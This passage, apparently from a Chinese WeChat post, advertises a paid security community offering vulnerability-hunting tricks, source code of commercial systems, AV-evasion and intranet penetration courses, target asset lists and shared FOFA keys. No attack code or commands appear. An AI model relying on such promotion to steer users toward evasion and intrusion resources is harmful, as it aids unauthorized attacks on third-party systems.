6、有圈子群可以技术交流以及不定期抽取证书&免费rank
7.分享各种护网资料各家安全厂商讲解视频&精选实战面试题目
8、各种框架漏洞技巧分享
9、各种源码分享（泛微、正方系统、用友等）
10、漏洞挖掘工具&信息收集工具&内网渗透免杀等网安工具分享
11、各种ctf资料以及题目分享
12、cnvd挖掘技巧&CNVD资产&src资产分享&补天1权重资产分享&fofakey共用
13、免杀、逆向、红队攻内网防渗透等课程分享
14、漏洞库&字典以各种内容不在一一说明
15、cisp-pte/pts&nisp一级&nisp二级&edusrc证书内部价格
15、如果有漏洞挖掘问题或者工具资料需求可以找群主(尽量满足)
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSY2pbvbP3qGAlW8O43bRvAISCxZm4UDTRsaMVbJKTsjfTMTDlq6qNBcVs4tkl4UzgqGz5ag81baU1rusKE09J9T6cMVliaibibwQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/MSDUaqtwboTrLRQpTicOR7bzyNiajiapVJgyMiaYlEDBVU87YXMnanOFWsCYN3cCVGsKkibzV9dMryvbFXBb4Z3472ib27RJ1Xq1HnKJIp5u49GYQ/640?wx_fmt=jpeg&from=appmsg "")  
  
**目前800多条内容，扫描下方二维码查看详情以及加入圈子，持续更新中。。**  
  
**如果觉得合适可以加入，价格不定期会根据圈子内容和圈子人数进行上调。。**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRngNCK3ae5W1nw179icr078zj1eBrn2aP1FVic1yJHdvbJ1sIKcZzNKlhXsbTfcUYdo0miblHoJpdcfG10cZfp6HbbHQfkfiajU40/640?wx_fmt=png&from=appmsg "")  
  
